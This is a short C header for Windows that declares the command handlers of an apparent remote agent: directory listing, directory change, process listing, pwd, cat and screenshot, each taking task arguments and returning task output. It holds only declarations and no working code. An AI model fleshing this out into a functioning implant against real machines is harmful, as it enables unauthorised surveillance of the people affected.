//
// Created by j4ck on 3/15/24.
//

#ifndef AGENT_COMMANDS_H
#define AGENT_COMMANDS_H
#include <windows.h>

BOOL CommandListDirectory(IN PCHAR pTaskArgs, OUT PBYTE *pTaskOutput);

BOOL CommandChangeDirectory(IN PCHAR pTaskArgs);

BOOL CommandListProcesses();


BOOL CommandPrintWorkingDirectory();

BOOL CommandCat();

PBYTE* CommandScreenshot();

#endif //AGENT_COMMANDS_H
